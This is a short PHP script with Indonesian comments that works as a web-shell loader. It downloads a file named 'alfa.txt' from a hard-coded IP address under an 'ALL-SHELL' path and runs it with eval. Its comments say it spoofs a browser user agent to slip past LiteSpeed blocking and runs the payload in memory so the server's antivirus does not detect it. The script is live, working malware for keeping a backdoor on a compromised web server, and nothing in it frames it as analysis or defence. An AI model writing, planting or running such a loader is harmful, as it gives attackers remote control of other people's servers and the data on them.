<?php
// --- Konfigurasi ---
$url = 'http://185.128.227.157/ALL-SHELL/raw-ker/alfa.txt';
$timeout = 20;

// --- Ambil konten via cURL ---
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
// Pakai User Agent Browser asli agar tidak diblokir LiteSpeed
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

$body = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($body === false || $http_code !== 200) {
    http_response_code(502);
    exit("Gagal mengambil data. Code: {$http_code}");
}

// Bersihkan BOM
if (substr($body, 0, 3) === "\xEF\xBB\xBF") {
    $body = substr($body, 3);
}

// Eksekusi
if (preg_match('/<\?php/i', $body)) {
    // Jalankan tanpa simpan file (menghindari deteksi antivirus server)
    eval('?>' . $body);
} else {
    header('Content-Type: text/plain');
    echo $body;
}
